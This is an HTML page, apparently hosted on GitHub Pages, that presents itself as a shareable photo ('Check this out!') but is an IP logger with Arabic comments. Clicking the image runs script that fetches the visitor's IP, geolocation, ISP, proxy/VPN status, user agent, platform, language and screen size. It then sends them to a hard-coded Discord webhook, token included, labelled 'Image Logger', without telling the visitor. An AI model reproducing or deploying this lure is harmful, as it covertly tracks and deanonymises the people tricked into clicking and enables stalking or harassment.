<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Image Maroc</title>
  <meta property="og:title" content="Check this out!">
  <meta property="og:description" content="Click to view the image.">
  <meta property="og:image" content="https://anas-com.github.io/image-maroc/photo.jpg"> <!-- استبدل برابط GitHub Pages الخاص بك -->
  <meta property="og:url" content="https://github.com/Anas-com"> <!-- استبدل برابط GitHub Pages الخاص بك -->
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #000;
    }
    img {
      max-width: 100%;
      max-height: 100%;
      cursor: pointer;
    }
    .message {
      position: fixed;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      color: white;
      background-color: rgba(0, 0, 0, 0.7);
      padding: 10px 20px;
      border-radius: 5px;
      font-family: Arial, sans-serif;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <img src="photo.jpg" alt="Image" onclick="logInfo()">
  <div class="message" id="message">
    Click Photo
  </div>

  <script>
    async function logInfo() {
      try {
        console.log("جاري جلب عنوان IP...");
        let ip = 'غير معروف';
        try {
          const ipResponse = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipResponse.json();
          ip = ipData.ip;
        } catch (ipError) {
          console.error("فشل في جلب عنوان IP:", ipError);
        }

        console.log("جاري جلب معلومات إضافية...");
        let infoData = {};
        try {
          const infoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
          infoData = await infoResponse.json();
        } catch (infoError) {
          console.error("فشل في جلب المعلومات الإضافية:", infoError);
        }

        const country = infoData.country || 'غير معروف';
        const region = infoData.regionName || 'غير معروف';
        const city = infoData.city || 'غير معروف';
        const timezone = infoData.timezone || 'غير معروف';
        const isp = infoData.isp || 'غير معروف';
        const as = infoData.as || 'غير معروف';
        const mobile = infoData.mobile ? 'نعم' : 'لا';
        const proxy = infoData.proxy ? 'نعم' : 'لا';

        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const language = navigator.language;
        const screenResolution = `${window.screen.width}x${window.screen.height}`;

        console.log("جاري إعداد البيانات لإرسالها إلى Discord...");
        const webhookURL = 'https://discord.com/api/webhooks/1334926552739086376/JGGI5sZsZqEOplR03c4_odbTkw1hByXykBul_NJ--Qj3OGA1GXO3fSuiZLajZICgHqAx'; // استبدل برابط الويبهوك الخاص بك
        const embed = {
          username: 'Image Logger',
          embeds: [
            {
              title: 'تم تسجيل IP جديد',
              color: 0x00ff00,
              fields: [
                { name: 'عنوان IP', value: ip },
                { name: 'البلد', value: country },
                { name: 'المنطقة', value: region },
                { name: 'المدينة', value: city },
                { name: 'المنطقة الزمنية', value: timezone },
                { name: 'مزود الخدمة', value: isp },
                { name: 'AS', value: as },
                { name: 'هاتف محمول', value: mobile },
                { name: 'بروكسي/ VPN', value: proxy },
                { name: 'User Agent', value: userAgent },
                { name: 'النظام', value: platform },
                { name: 'اللغة', value: language },
                { name: 'دقة الشاشة', value: screenResolution },
              ],
              timestamp: new Date().toISOString(),
            },
          ],
        };

        console.log("جاري إرسال البيانات إلى Discord...");
        await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(embed),
        });

        console.log("تم إرسال البيانات بنجاح!");
        document.getElementById('message').textContent = 'Successfully Photo God';
      } catch (error) {
        console.error('حدث خطأ أثناء تسجيل المعلومات:', error);
        document.getElementById('message').textContent = 'Failed to show Photo.';
      }
    }
  </script>
</body>
</html>
